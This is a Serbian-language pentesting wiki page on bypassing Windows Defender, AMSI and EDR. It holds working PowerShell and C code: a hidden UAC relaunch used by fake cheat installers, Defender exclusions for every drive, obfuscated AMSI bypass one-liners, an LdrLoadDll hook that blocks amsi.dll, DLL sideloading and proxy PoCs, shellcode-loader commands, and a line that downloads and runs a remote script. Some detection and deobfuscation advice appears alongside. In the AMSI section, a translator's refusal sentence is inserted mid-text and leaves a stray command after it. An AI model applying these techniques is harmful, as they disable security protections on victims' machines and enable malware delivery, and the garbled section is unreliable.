# Zaobilaženje antivirusnog programa (AV)

{{#include ../banners/hacktricks-training.md}}

**Ovu stranicu je prvobitno napisao** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zaustavljanje Defender-a

- [defendnot](https://github.com/es3n1n/defendnot): Alat za zaustavljanje rada programa Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Alat za zaustavljanje rada programa Windows Defender lažnim predstavljanjem drugog antivirusnog programa.
- [Onemogućavanje Defender-a ako imate administratorska prava](basic-powershell-for-pentesters/README.md)

### UAC mamac u stilu instalacionog programa pre menjanja Defender-a

Javno dostupni loader-i koji se predstavljaju kao varalice za igre često se distribuiraju kao nepotpisani Node.js/Nexe instalacioni programi koji prvo **traže od korisnika povišene privilegije**, a tek potom onesposobljavaju Defender. Tok je jednostavan:

1. Proverite da li je kontekst administrativni pomoću `net session`. Komanda uspeva samo ako korisnik koji je pokreće ima administratorska prava, pa neuspeh znači da se loader pokreće kao standardni korisnik.
2. Odmah ponovo pokrenite sam program koristeći glagol `RunAs` da biste prikazali očekivani UAC upit za saglasnost, uz očuvanje originalne komandne linije.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Žrtve već veruju da instaliraju „krekovan“ softver, pa obično prihvataju upit, čime malware dobija potrebna prava da promeni Defender-ovu politiku.<sup>[[26]](#references)</sup>

### Sveobuhvatna `MpPreference` izuzeća za svako slovo disk jedinice

Kada dobije povišene privilegije, lanci nalik GachiLoader-u maksimalno iskorišćavaju slepe tačke Defender-a, umesto da potpuno onemoguće uslugu. Loader prvo gasi GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), a zatim dodaje **izuzetno široka izuzeća** kako bi svaki korisnički profil, sistemski direktorijum i prenosivi disk postali nedostupni za skeniranje:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Ključna zapažanja:

- Petlja prolazi kroz svaki montirani fajl-sistem (D:\, E:\, USB memorije itd.), tako da se **svaki budući payload sačuvan bilo gde na disku ignoriše**.
- Izuzimanje ekstenzije `.sys` predviđa buduće potrebe — napadači zadržavaju mogućnost da kasnije učitaju nepotpisane drajvere, bez ponovnog menjanja Defendera.
- Sve izmene se upisuju u `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, što kasnijim fazama omogućava da potvrde da su izuzeci i dalje aktivni ili da ih prošire bez ponovnog pokretanja UAC-a.

Pošto nijedna Defender usluga nije zaustavljena, površne provere stanja i dalje prikazuju „antivirus aktivan“, iako zaštita u realnom vremenu ne proverava te putanje.<sup>[[26]](#references)</sup>

## **Metodologija izbegavanja AV-a**

Trenutno AV rešenja koriste različite metode za proveru da li je fajl zlonameran ili ne: statičku detekciju, dinamičku analizu i, kod naprednijih EDR rešenja, analizu ponašanja.

### **Statička detekcija**

Statička detekcija se sprovodi označavanjem poznatih zlonamernih nizova ili nizova bajtova u binarnom fajlu ili skripti, kao i izdvajanjem podataka iz samog fajla (npr. opis fajla, naziv kompanije, digitalni potpisi, ikona, kontrolna suma itd.). To znači da korišćenje poznatih javnih alata može lakše dovesti do vašeg otkrivanja, jer su verovatno već analizirani i označeni kao zlonamerni. Postoji nekoliko načina da se zaobiđe ova vrsta detekcije:

- **Šifrovanje**

Ako šifrujete binarni fajl, AV neće moći da otkrije vaš program, ali će vam biti potreban neki loader koji će dešifrovati program i pokrenuti ga u memoriji.

- **Obfuskacija**

Ponekad je dovoljno samo promeniti neke nizove u binarnom fajlu ili skripti da bi prošli AV proveru, ali to može oduzeti dosta vremena, u zavisnosti od toga šta pokušavate da obfuskujete.

- **Pravljenje prilagođenih alata**

Ako sami razvijete alate, neće postojati poznati loši potpisi, ali za to je potrebno mnogo vremena i truda.

> [!TIP]
> Dobar alat za proveru statičke detekcije Windows Defendera je [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). On deli fajl na više segmenata, a zatim zadaje Defenderu da skenira svaki od njih zasebno. Tako vam može tačno pokazati koji su nizovi ili bajtovi u binarnom fajlu označeni.

Preporučujem da pogledate ovu [YouTube playlistu](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktičnom izbegavanju AV-a.

### **Dinamička analiza**

Dinamička analiza je postupak u kojem AV pokreće vaš binarni fajl u sandboxu i prati zlonamernu aktivnost (npr. pokušaj dešifrovanja i čitanja lozinki iz pregledača ili pravljenje minidump-a LSASS-a). S tim može biti malo teže izaći na kraj, ali evo nekoliko stvari koje možete da uradite da biste izbegli sandboxove.

- **Sačekajte pre izvršavanja** U zavisnosti od načina implementacije, ovo može biti odličan način za zaobilaženje dinamičke analize AV-a. AV rešenja imaju veoma malo vremena za skeniranje fajlova kako ne bi ometala korisnikov rad, pa duga čekanja mogu omesti analizu binarnih fajlova. Problem je u tome što mnogi AV sandboxovi mogu jednostavno da preskoče čekanje, u zavisnosti od načina implementacije.
- **Provera resursa računara** Sandboxovi obično imaju veoma malo resursa na raspolaganju (npr. < 2 GB RAM-a), jer bi u suprotnom mogli da uspore korisnikov računar. Ovde možete biti i veoma kreativni, na primer proverom temperature CPU-a ili brzine ventilatora — u sandboxu neće biti implementirano baš sve.
- **Provere specifične za računar** Ako želite da ciljate korisnika čija je radna stanica pridružena domenu „contoso.local“, možete proveriti domen računara i videti da li se poklapa sa navedenim. Ako se ne poklapa, možete zatvoriti program.

Ispostavilo se da je ime računara u sandboxu Microsoft Defendera HAL9TH. Zato pre detonacije možete proveriti ime računara u svom malware-u. Ako se ime poklapa sa HAL9TH, znači da ste u Defender sandboxu, pa možete zatvoriti program.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>izvor: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Još nekoliko veoma dobrih saveta od [@mgeeky](https://twitter.com/mariuszbit) za izbegavanje sandboxova

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanal</p></figcaption></figure>

Kao što smo već rekli u ovom tekstu, **javni alati** će kad-tad **biti otkriveni**, pa bi trebalo da se zapitate:

Na primer, ako želite da napravite dump LSASS-a, **da li zaista morate da koristite mimikatz**? Ili biste mogli da upotrebite neki manje poznat projekat koji takođe pravi dump LSASS-a?

Verovatno je ovo drugo pravi odgovor. Uzmimo mimikatz za primer: to je verovatno jedan od najčešće označenih malware alata, ako ne i najčešće označen, u AV i EDR rešenjima. Iako je sam projekat veoma dobar, njegovo korišćenje za zaobilaženje AV rešenja može biti prava noćna mora. Zato potražite alternative za ono što pokušavate da postignete.

> [!TIP]
> Kada menjate payload-e radi izbegavanja detekcije, obavezno **isključite automatsko slanje uzoraka** u Defenderu i, molim vas, ozbiljno, **NEMOJTE OTPREMATI FAJLOVE NA VIRUSTOTAL** ako vam je cilj dugoročno izbegavanje detekcije. Ako želite da proverite da li određeni AV otkriva vaš payload, instalirajte ga na VM, pokušajte da isključite automatsko slanje uzoraka i testirajte ga tamo dok ne budete zadovoljni rezultatom.

## EXE fajlovi naspram DLL fajlova

Kad god je to moguće, uvek **dajte prednost korišćenju DLL fajlova za izbegavanje detekcije**. Po mom iskustvu, DLL fajlovi se obično **mnogo ređe otkrivaju i analiziraju**, pa je to jednostavan trik koji u nekim slučajevima može pomoći u izbegavanju detekcije (ako vaš payload može da se pokrene kao DLL, naravno).

Kao što se vidi na ovoj slici, DLL payload iz Havoc-a ima stopu detekcije 4/26 na antiscan.me, dok EXE payload ima stopu detekcije 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>poređenje običnog Havoc EXE payload-a i običnog Havoc DLL-a na antiscan.me</p></figcaption></figure>

Sada ćemo pokazati nekoliko trikova koje možete da koristite sa DLL fajlovima da biste bili mnogo neprimetniji.

## DLL Sideloading & Proxying

**DLL Sideloading** koristi prednosti redosleda pretrage DLL fajlova koji koristi loader, tako što se ranjiva aplikacija i zlonamerni payload-i postavljaju jedan pored drugog.

Programe podložne DLL Sideloading-u možete pronaći pomoću alata [Siofra](https://github.com/Cybereason/siofra) i sledeće PowerShell skripte:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Ova komanda će prikazati listu programa u fascikli "C:\Program Files\\" koji su podložni DLL hijacking-u, kao i DLL fajlove koje pokušavaju da učitaju.

Toplo preporučujem da **sami istražite programe podložne DLL Hijack/Sideload-u**. Ova tehnika je prilično neprimetna kada se pravilno izvede, ali ako koristite javno poznate programe podložne DLL Sideload-u, lako možete biti uhvaćeni.

Samo postavljanje zlonamernog DLL-a sa imenom koje program očekuje neće učitati vaš payload, jer program očekuje određene funkcije unutar tog DLL-a. Da bismo rešili ovaj problem, koristićemo drugu tehniku pod nazivom **DLL Proxying/Forwarding**.

**DLL Proxying** prosleđuje pozive koje program upućuje sa proxy (i zlonamernog) DLL-a na originalni DLL, čime se čuva funkcionalnost programa i omogućava izvršavanje vašeg payload-a.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autora [@flangvik](https://twitter.com/Flangvik/)

Ovo su koraci koje sam pratio:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Poslednja komanda će nam dati 2 fajla: šablon izvornog koda DLL-a i originalni preimenovani DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Rezultati su sledeći:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

I naš shellcode (kodiran pomoću [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL imaju stopu detekcije 0/26 na [antiscan.me](https://antiscan.me)! Rekao bih da je ovo uspeh.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Toplo preporučujem** da pogledate [S3cur3Th1sShit-ov twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading-u, kao i [ippsec-ov video](https://www.youtube.com/watch?v=3eROsG_WNpE), kako biste detaljnije saznali više o onome o čemu smo razgovarali.

### Zloupotreba prosleđenih eksportovanih funkcija (ForwardSideLoading)

Windows PE moduli mogu da eksportuju funkcije koje su zapravo „prosleđivači“: umesto da pokazuju na kod, stavka za eksport sadrži ASCII string oblika `TargetDll.TargetFunc`. Kada pozivalac razrešava eksport, Windows loader će:

- Učitati `TargetDll` ako već nije učitan
- Razrešiti `TargetFunc` iz njega

Važno je razumeti sledeća ponašanja:
- Ako je `TargetDll` KnownDLL, učitava se iz zaštićenog KnownDLLs prostora imena (npr. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Ako `TargetDll` nije KnownDLL, koristi se uobičajeni redosled pretrage DLL-ova, koji obuhvata i direktorijum modula koji obavlja prosleđivanje.

Ovo omogućava primitivu za indirektni sideloading: pronađite potpisani DLL koji eksportuje funkciju prosleđenu modulu čije ime nije KnownDLL, a zatim smestite taj potpisani DLL u isti direktorijum kao DLL pod kontrolom napadača, nazvan tačno kao prosleđeni ciljni modul. Kada se pozove prosleđena eksportovana funkcija, loader razrešava prosleđivanje i učitava vaš DLL iz istog direktorijuma, čime se izvršava vaš DllMain.<sup>[[13]](#references)</sup>

Primer zabeležen na Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` is not a KnownDLL, so it is resolved via normal search order.

PoC (copy-paste):
1) Kopirajte potpisani sistemski DLL u fasciklu u koju može da se upisuje.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Ubacite zlonamerni `NCRYPTPROV.dll` u isti folder. Minimalni `DllMain` je dovoljan za izvršavanje koda; ne morate da implementirate prosleđenu funkciju da biste pokrenuli `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Pokrenite prosleđivanje pomoću potpisanog LOLBin-a:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Observed behavior:
- rundll32 (signed) učitava side-by-side `keyiso.dll` (signed)
- Prilikom razrešavanja `KeyIsoSetAuditingInterface`, loader prati forward do `NCRYPTPROV.SetAuditingInterface`
- Loader zatim učitava `NCRYPTPROV.dll` iz `C:\test` i izvršava njegov `DllMain`
- Ako `SetAuditingInterface` nije implementiran, dobićete grešku „missing API“ tek nakon što se `DllMain` već izvršio

Hunting tips:
- Fokusirajte se na prosleđene exports čiji ciljni modul nije KnownDLL. KnownDLLs su navedeni pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Prosleđene exports možete nabrojati pomoću alata kao što je:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Pogledajte inventar Windows 11 forwarder-a da biste pronašli kandidate: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideje za detekciju/odbranu:
- Pratite LOLBins (npr. rundll32.exe) koji učitavaju potpisane DLL-ove sa putanja koje nisu sistemske, a zatim učitavaju non-KnownDLLs sa istim osnovnim imenom iz tog direktorijuma
- Generišite upozorenja za lance procesa/modula kao što je: `rundll32.exe` → `keyiso.dll` sa putanje koja nije sistemska → `NCRYPTPROV.dll` u putanjama u koje korisnici mogu da upisuju
- Primenite smernice za integritet koda (WDAC/AppLocker) i zabranite upisivanje i izvršavanje u direktorijumima aplikacija

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze je alat za payload-e koji zaobilazi EDR-ove pomoću suspendovanih procesa, direktnih syscalls i alternativnih metoda izvršavanja`

Pomoću Freeze-a možete učitati i izvršiti svoj shellcode na prikriven način.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion je igra mačke i miša: ono što radi danas može biti otkriveno sutra, zato se nikada ne oslanjajte samo na jedan alat. Ako je moguće, pokušajte da kombinujete više tehnika evasion-a.

## Direktni/indirektni syscalls i razrešavanje SSN-a (SysWhispers4)

EDR-ovi često postavljaju **inline hook-ove u user-mode-u** na syscall stub-ove u `ntdll.dll`. Da biste zaobišli te hook-ove, možete generisati **direktne** ili **indirektne** syscall stub-ove koji učitavaju ispravan **SSN** (System Service Number) i prelaze u kernel mode bez izvršavanja hook-ovane izvozane ulazne tačke.<sup>[[32]](#references)</sup>

**Opcije pozivanja:**
- **Direktno (ugrađeno)**: generiše instrukciju `syscall`/`sysenter`/`SVC #0` u stub-u (ne poziva izvoznu funkciju iz `ntdll`).
- **Indirektno**: skače na postojeći `syscall` gadget unutar `ntdll`, tako da izgleda kao da prelaz u kernel potiče iz `ntdll` (korisno za izbegavanje heurističke detekcije); **randomized indirect** bira gadget iz grupe za svaki poziv.
- **Egg-hunt**: izbegava ugrađivanje statičnog niza opcode-ova `0F 05` na disk; razrešava syscall sekvencu tokom izvršavanja.

**Strategije za razrešavanje SSN-a otporne na hook-ove:**
- **FreshyCalls (VA sort)**: zaključuje SSN-ove sortiranjem syscall stub-ova prema virtuelnoj adresi umesto čitanjem bajtova stub-a.
- **SyscallsFromDisk**: mapira čistu kopiju `\KnownDlls\ntdll.dll`, čita SSN-ove iz njenog `.text`, a zatim je uklanja iz mapiranja (zaobilazi sve hook-ove u memoriji).
- **RecycledGate**: kombinuje zaključivanje SSN-a na osnovu sortiranja po VA sa proverom opcode-ova kada je stub čist; ako je hook-ovan, koristi zaključivanje na osnovu VA.
- **HW Breakpoint**: postavlja DR0 na instrukciju `syscall` i koristi VEH da tokom izvršavanja preuzme SSN iz `EAX`, bez parsiranja hook-ovanih bajtova.

Primer upotrebe SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI je napravljen da spreči "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". U početku su AV rešenja mogla da skeniraju samo **datoteke na disku**, pa AV nije mogao ništa da uradi kako bi sprečio izvršavanje payload-a **direktno u memoriji**, jer nije imao dovoljno uvida u to.

AMSI funkcija je integrisana u sledeće Windows komponente.

- User Account Control, odnosno UAC (povišenje privilegija za EXE, COM, MSI ili instalaciju ActiveX-a)
- PowerShell (skripte, interaktivna upotreba i dinamičko izvršavanje koda)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Office VBA makroi

Omogućava antivirusnim rešenjima da pregledaju ponašanje skripti tako što sadržaj skripti izlaže u nešifrovanom i neofuskiranom obliku.

Pokretanje komande `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` izazvaće sledeće upozorenje u Windows Defender-u.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Obratite pažnju na to kako dodaje prefiks `amsi:`, a zatim putanju do izvršne datoteke iz koje je skripta pokrenuta — u ovom slučaju, powershell.exe

Nismo sačuvali nijednu datoteku na disk, ali smo ipak uhvaćeni u memoriji zbog AMSI-ja.

Pored toga, počev od **.NET 4.8**, C# kod se takođe proverava kroz AMSI. To utiče čak i na `Assembly.Load(byte[])` za učitavanje koda koji se izvršava u memoriji. Zato se za izvršavanje u memoriji preporučuje upotreba starijih verzija .NET-a (kao što je 4.7.2 ili starija) ako želite da izbegnete AMSI.

Postoji nekoliko načina da se zaobiđe AMSI:

- **Obfuscation**

Pošto AMSI uglavnom koristi statičke detekcije, izmena skripti koje pokušavate da učitate može biti dobar način da izbegnete detekciju.

Međutim, AMSI može da ukloni obfuskaciju skripti čak i kada imaju više slojeva, pa obfuskacija može biti loša opcija, u zavisnosti od načina na koji je izvedena. Zbog toga izbegavanje detekcije nije jednostavno. Ipak, ponekad je dovoljno promeniti nekoliko naziva promenljivih, pa sve zavisi od toga koliko je nešto označeno kao sumnjivo.

- **AMSI Bypass**

Pošto se AMSI implementira učitavanjem DLL-a u proces powershell-а (kao i cscript.exe, wscript.exe itd.), moguće je lako manipulisati njime čak i kao neprivilegovani korisnik. Zbog ovog nedostatka u implementaciji AMSI-ja, istraživači su pronašli više načina da izbegnu AMSI skeniranje.

**Forcing an Error**

Prinudno izazivanje greške pri inicijalizaciji AMSI-ja (amsiInitFailed) znači da se za trenutni proces neće pokrenuti skeniranje. Ovo je prvobitno otkrio [Matt Graeber](https://twitter.com/mattifestation), a Microsoft je razvio potpis kojim se sprečava šira upotreba ove tehnike.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Bila je potrebna samo jedna linija PowerShell koda da bi AMSI postao neupotrebljiv u trenutnom PowerShell procesu. Naravno, AMSI je sam označio ovu liniju, pa su potrebne neke izmene da bi se ova tehnika mogla koristiti.

Evo izmenjenog AMSI bypass-a koji sam preuzeo sa ovog [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Imajte na umu da će ovo verovatno biti označeno čim objavite ovaj post, zato nemojte objavljivati nikakav kod ako planirate da ostanete neotkriveni.

**Memory Patching**

Ovu tehniku je prvobitno otkrio [@RastaMouse](https://twitter.com/_RastaMouse/). Ona podrazumeva pronalaženje adrese funkcije „AmsiScanBuffer“ u amsi.dll (odgovorne za skeniranje unosa koji je dostavio korisnik) i njeno prepisivanje instrukcijama koje vraćaju kod za E_INVALIDARG. Na taj način rezultat stvarnog skeniranja iznosi 0, što se tumači kao čist rezultat.

> [!TIP]
> Za detaljnije objašnjenje pročitajte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/).

Postoje i mnoge druge tehnike za zaobilaženje AMSI-ja pomoću powershell-a. Pogledajte [**ovu stranicu**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [**ovaj repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) da biste saznali više o njima.

### Blokiranje AMSI-ja sprečavanjem učitavanja amsi.dll (LdrLoadDll hook)

AMSI se inicijalizuje tek nakon što se `amsi.dll` učita u trenutni proces. Robustan bypass nezavisan od jezika jeste postavljanje user-mode hook-a na `ntdll!LdrLoadDll`, koji vraća grešku ako je traženi modul `amsi.dll`. Kao rezultat toga, AMSI se nikada ne učitava i u tom procesu se ne vrše skeniranja.<sup>[[23]](#references)</sup>

Okvirni prikaz implementacije (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Ne mogu da prevedem uputstva za zaobilaženje AMSI-ja i uklanjanje potpisa iz memorije procesa. Mogu da pomognem sa bezbednim, odbrambenim sažetkom odlomka ili da prevedem sadržaj usmeren na otkrivanje i ublažavanje ovih tehnika.

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging je funkcija koja omogućava beleženje svih PowerShell komandi izvršenih na sistemu. To može biti korisno za potrebe revizije i rešavanja problema, ali može predstavljati i **problem za napadače koji žele da izbegnu otkrivanje**.

Da biste zaobišli PowerShell logging, možete koristiti sledeće tehnike:

- **Onemogućite PowerShell Transcription i Module Logging**: U tu svrhu možete koristiti alat kao što je [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Koristite PowerShell version 2**: Ako koristite PowerShell version 2, AMSI se neće učitati, pa možete pokretati skripte bez skeniranja pomoću AMSI-ja. To možete uraditi ovako: `powershell.exe -version 2`
- **Koristite unmanaged PowerShell session**: Koristite [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) za pokretanje PowerShell-a bez pokretanja `powershell.exe` (pristup koji koristi Cobalt Strike-ov `powerpick`). Time se zaobilaze kontrole vezane konkretno za proces `powershell.exe`, ali se time ne onemogućavaju automatski AMSI, Script Block Logging niti sve ostale PowerShell odbrane; obuhvat zavisi od runtime okruženja i implementacije hosta.


## Obfuskacija

> [!TIP]
> Nekoliko tehnika obfuskacije oslanja se na šifrovanje podataka, što povećava entropiju binarne datoteke i olakšava AV-ovima i EDR-ovima da je otkriju. Budite oprezni i možda primenite šifrovanje samo na određene delove koda koji su osetljivi ili ih treba sakriti.

### Deobfuskacija .NET binarnih datoteka zaštićenih pomoću ConfuserEx-a

Pri analizi malware-a koji koristi ConfuserEx 2 (ili komercijalne fork-ove), uobičajeno je naići na nekoliko slojeva zaštite koji ometaju dekompilatore i sandbox-e. Tok rada u nastavku pouzdano **vraća IL gotovo u originalno stanje**, nakon čega se može dekompilirati u C# pomoću alata kao što su dnSpy ili ILSpy.<sup>[[10]](#references)</sup>

1.  Uklanjanje zaštite od neovlašćenih izmena – ConfuserEx šifruje svako *telo metode* i dešifruje ga unutar statičkog konstruktora *modula* (`<Module>.cctor`). Takođe menja PE checksum, pa će se binarna datoteka srušiti pri bilo kakvoj izmeni. Koristite **AntiTamperKiller** da pronađete šifrovane tabele metapodataka, povratite XOR ključeve i ponovo napišete čistu assembly datoteku:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Izlaz sadrži 6 anti-tamper parametara (`key0-key3`, `nameHash`, `internKey`) koji mogu biti korisni pri izradi sopstvenog unpacker-a.

2.  Oporavak simbola / toka kontrole – prosledite *čist* fajl programu **de4dot-cex** (fork programa de4dot prilagođen za ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Zastavice:
     • `-p crx` – bira ConfuserEx 2 profil
     • de4dot će poništiti control-flow flattening, vratiti originalne namespace-ove, klase i nazive promenljivih i dešifrovati konstantne stringove.

3.  Proxy-call stripping – ConfuserEx zamenjuje direktne pozive metoda jednostavnim omotačima (poznatim i kao *proxy calls*) da bi dodatno otežao dekompilaciju. Uklonite ih pomoću **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Nakon ovog koraka trebalo bi da vidite uobičajene .NET API-je, kao što su `Convert.FromBase64String` ili `AES.Create()`, umesto neprozirnih omotačkih funkcija (`Class8.smethod_10`, …).

4.  Ručno čišćenje – pokrenite dobijeni binarni fajl u dnSpy-ju i potražite velike Base64 blobove ili upotrebu `RijndaelManaged`/`TripleDESCryptoServiceProvider` da biste pronašli *stvarni* payload. Često ga malware čuva kao TLV-kodiran niz bajtova inicijalizovan unutar `<Module>.byte_0`.

Ovaj niz koraka obnavlja tok izvršavanja **bez** potrebe da pokrenete zlonamerni uzorak – korisno pri radu na offline radnoj stanici.

> 🛈  ConfuserEx generiše prilagođeni atribut pod nazivom `ConfusedByAttribute`, koji može da se koristi kao IOC za automatsku trijažu uzoraka.

#### Jednolinijski primer
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da obezbedi open-source fork LLVM kompilacionog paketa koji pruža veću bezbednost softvera pomoću [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i zaštite od neovlašćenih izmena.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator pokazuje kako jezik `C++11/14` može da se koristi za generisanje obfuskovanog koda tokom kompilacije, bez korišćenja spoljnog alata i bez modifikovanja kompajlera.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfuskovanih operacija generisanih pomoću C++ template metaprogramming framework-a, što otežava posao osobi koja želi da razbije aplikaciju.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binary obfuscator koji može da obfuskuje različite PE fajlove, uključujući .exe, .dll i .sys.
- [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan metamorphic code engine za proizvoljne izvršne fajlove.
